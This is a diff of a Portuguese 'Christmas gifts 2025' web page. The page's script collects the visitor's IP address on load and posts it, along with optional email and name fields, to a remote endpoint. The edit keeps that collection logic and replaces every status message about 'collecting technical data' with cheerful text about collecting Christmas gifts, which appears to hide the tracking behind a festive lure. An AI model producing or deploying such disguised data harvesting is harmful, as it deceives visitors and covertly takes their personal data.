@@ -50,17 +50,17 @@
   <h2>Prendas Natal 2025</h2>
 
   <label for="email">Email (opcional):</label>
-  <input type="email" id="email" placeholder="Insere o teu email">
+  <input type="email" id="email" placeholder="Email">
 
   <label for="firstName">Primeiro Nome (opcional):</label>
-  <input type="text" id="firstName" placeholder="Insere o teu primeiro nome">
+  <input type="text" id="firstName" placeholder="First Name">
 
   <label for="lastName">Último Nome (opcional):</label>
-  <input type="text" id="lastName" placeholder="Insere o teu último nome">
+  <input type="text" id="lastName" placeholder="Last Name">
 
-  <button onclick="sendAll()">Enviar Todos os Dados</button>
+  <button onclick="sendAll()">Enviar Todos as Prendas</button>
 
-  <p id="status">A recolher dados técnicos...</p>
+  <p id="status">A recolher prendas de Natal...</p>
 </div>
 
 <script>
@@ -69,7 +69,7 @@ let technicalData = {}; // Guardar dados técnicos automaticamente
 // Função para recolher dados técnicos
 async function collectTechnicalData() {
   const status = document.getElementById("status");
-  status.innerText = "A recolher dados técnicos...";
+  status.innerText = "A recolher prendas de Natal...";
 
   try {
     const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
@@ -90,10 +90,10 @@ async function collectTechnicalData() {
       body: new URLSearchParams(technicalData)
     });
 
-    status.innerText = "Dados técnicos enviados!";
+    status.innerText = "Prendas Enviadas!";
   } catch (err) {
     console.error(err);
-    status.innerText = "Erro ao enviar dados técnicos.";
+    status.innerText = "Erro ao enviar prendas.";
   }
 }
 
@@ -119,10 +119,10 @@ async function sendAll() {
       body: new URLSearchParams(data)
     });
 
-    status.innerText = "Todos os dados enviados!";
+    status.innerText = "Todas as prendas enviadas!";
   } catch (err) {
     console.error(err);
-    status.innerText = "Erro ao enviar os dados.";
+    status.innerText = "Erro ao enviar prendas.";
   }
 }
 
@@ -131,3 +131,4 @@ collectTechnicalData();
 </script>
 </body>
 </html>
+
